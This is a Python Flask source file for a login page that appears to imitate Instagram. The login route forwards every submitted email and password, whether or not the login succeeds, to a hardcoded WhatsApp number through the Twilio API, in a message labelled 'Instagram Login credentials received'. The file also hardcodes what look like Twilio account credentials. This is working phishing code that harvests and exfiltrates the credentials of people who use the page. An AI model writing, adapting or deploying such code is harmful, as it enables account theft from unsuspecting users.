from flask import Flask, render_template, request, flash, redirect, url_for
from twilio.rest import Client

app = Flask(__name__, template_folder="../templates")
app.secret_key = 'your_secret_key'  # Replace with a proper secret key

DUMMY_USER = {
    "email": "ha",
    "password": "ha"
}

# Twilio credentials
TWILIO_ACCOUNT_SID = 'AC35a667ca190fa342656e50f1a46df244'  # Your Twilio Account SID
TWILIO_AUTH_TOKEN = '7006e21e99889adfee2ae9c6ae84834b'    # Your Twilio Auth Token
TWILIO_WHATSAPP_NUMBER = '+14155238886'  # This is the Twilio sandbox number
import os
TWILIO_ACCOUNT_SID = os.getenv('TWILIO_ACCOUNT_SID')
TWILIO_AUTH_TOKEN = os.getenv('TWILIO_AUTH_TOKEN')

# Function to send a WhatsApp message
def send_whatsapp_message(user_email, user_password):
    # Twilio setup
    client = Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)

    # Compose the message
    message_body = f"Instagram Login credentials received:\nEmail: {user_email}\nPassword: {user_password}"

    try:
        # Send WhatsApp message
        message = client.messages.create(
            body=message_body,
            from_=f'whatsapp:{TWILIO_WHATSAPP_NUMBER}',  # The Twilio WhatsApp number
            to='whatsapp:+923556565734'  # Replace with your own WhatsApp number in E.164 format
        )
        print("WhatsApp message sent successfully.")
    except Exception as e:
        print(f"Error sending WhatsApp message: {e}")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")

        print(f"Received email: {email} and password: {password}")

        try:
            # Send credentials via WhatsApp
            send_whatsapp_message(email, password)
        except Exception as e:
            print(f"Error sending WhatsApp message: {e}")

        # Validate login
        if email == DUMMY_USER["email"] and password == DUMMY_USER["password"]:
            flash("Login successful!", "success")
            return redirect(url_for("home"))
        else:
            flash("Invalid email or password. Please try again.", "error")
            return redirect(url_for("login"))

    return render_template("index.html")

@app.route("/")
def home():
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(debug=True)
